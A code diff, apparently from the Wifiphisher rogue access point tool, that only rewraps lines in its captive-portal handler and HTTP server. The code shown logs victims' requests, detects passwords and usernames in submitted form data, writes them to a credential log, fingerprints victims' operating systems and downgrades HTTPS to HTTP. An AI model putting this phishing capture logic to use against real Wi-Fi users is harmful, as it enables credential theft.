@@ -97,17 +97,15 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
 
         log_file_path = "/tmp/wifiphisher-webserver.tmp"
         with open(log_file_path, "a+") as log_file:
-            log_file.write("GET request from {0} for {1}\n".format(
-                self.request.remote_ip, self.request.full_url()))
+            log_file.write("GET request from {0} for {1}\n".format(self.request.remote_ip,
+                                                                   self.request.full_url()))
         # record the GET request in the logging file
-        logger.info("GET request from %s for %s", self.request.remote_ip,
-                    self.request.full_url())
+        logger.info("GET request from %s for %s", self.request.remote_ip, self.request.full_url())
 
         # Find the victim object that corresponds to the ip address
         # And try to Discover OS by requestt
         victims_instance = victim.Victims.get_instance()
-        victims_instance.associate_victim_ip_to_os(self.request.remote_ip,
-                                                   self.request.full_url())
+        victims_instance.associate_victim_ip_to_os(self.request.remote_ip, self.request.full_url())
 
     def post(self):
         """
@@ -138,17 +136,15 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
                 log_file.write("POST request from {0} with {1}\n".format(
                     self.request.remote_ip, post_data))
                 # record the post requests in the logging file
-                logger.info("POST request from %s with %s",
-                            self.request.remote_ip, post_data)
+                logger.info("POST request from %s with %s", self.request.remote_ip, post_data)
             if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or \
                re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
                 if credential_log_path:
                     with open(credential_log_path, 'a+') as credential_log:
                         credential_log.write("{} {}".format(
-                            time.strftime(
-                                constants.CREDENTIALS_DATETIME_FORMAT),
-                            "POST request from {0} with {1}\n".format(
-                                self.request.remote_ip, post_data)))
+                            time.strftime(constants.CREDENTIALS_DATETIME_FORMAT),
+                            "POST request from {0} with {1}\n".format(self.request.remote_ip,
+                                                                      post_data)))
                 creds.append(post_data)
                 terminate = True
 
@@ -168,8 +164,7 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
         # Find the victim object that corresponds to the ip address
         # And try to Discover OS by request
         victims_instance = victim.Victims.get_instance()
-        victims_instance.associate_victim_ip_to_os(self.request.remote_ip,
-                                                   self.request.full_url())
+        victims_instance.associate_victim_ip_to_os(self.request.remote_ip, self.request.full_url())
 
 
 def runHTTPServer(ip, port, ssl_port, t, em):
@@ -195,8 +190,7 @@ def runHTTPServer(ip, port, ssl_port, t, em):
     ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
 
     https_server = tornado.httpserver.HTTPServer(
-        ssl_app,
-        ssl_options={
+        ssl_app, ssl_options={
             "certfile": constants.PEM,
             "keyfile": constants.PEM,
         })
